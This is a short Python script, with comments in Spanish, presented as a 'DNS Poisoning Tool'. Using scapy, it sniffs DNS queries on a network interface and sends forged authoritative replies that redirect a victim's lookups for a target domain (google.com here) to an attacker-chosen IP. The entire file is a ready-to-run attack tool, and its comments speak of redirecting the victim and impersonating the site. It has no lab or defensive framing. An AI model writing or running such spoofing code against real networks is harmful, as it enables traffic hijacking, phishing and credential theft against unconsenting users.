#!/usr/bin/env python3
# D31B1 DNS Poisoning Tool
# Uso: sudo python3 d31b1_dns_poison.py

from scapy.all import *

# CONFIGURACIÓN
MY_IP = "20.24.20.2"       # A donde quieres redirigir a la víctima
TARGET_DOMAIN = "google.com" # El sitio que quieres suplantar
TARGET_IFACE = "eth0"

def process_packet(packet):
    # Verificar si es paquete DNS y es una consulta (qr=0)
    if packet.haslayer(DNS) and packet[DNS].qr == 0:
        # Decodificar el nombre buscado (viene en bytes)
        query_name = packet[DNS].qd.qname.decode("utf-8")
        
        # Si busca nuestro objetivo (ej. "google.com.")
        if TARGET_DOMAIN in query_name:
            print(f"\n[+] Interceptado: {query_name}")
            print(f"[->] Redirigiendo a: {MY_IP}")

            # Construir respuesta falsa
            eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
            ip = IP(src=packet[IP].dst, dst=packet[IP].src)
            udp = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
            
            # Respuesta DNS
            # an (Answer) es donde ponemos la mentira
            dns_response = DNS(
                id=packet[DNS].id,
                qr=1, aa=1, rd=1, ra=1, # Flags de respuesta autoritativa
                qd=packet[DNS].qd,      # Copiamos la pregunta original
                an=DNSRR(rrname=query_name, rdata=MY_IP, ttl=100)
            )
            
            spoofed_packet = eth / ip / udp / dns_response
            sendp(spoofed_packet, iface=TARGET_IFACE, verbose=0)

def start_dns_spoofing():
    print(f"\n[*] DNS POISONER ACTIVO para dominio: {TARGET_DOMAIN}")
    print(f"[*] Redirigiendo tráfico a: {MY_IP}")
    
    # Escuchamos tráfico UDP puerto 53 (DNS)
    sniff(filter="udp port 53", prn=process_packet, iface=TARGET_IFACE)

if __name__ == "__main__":
    start_dns_spoofing()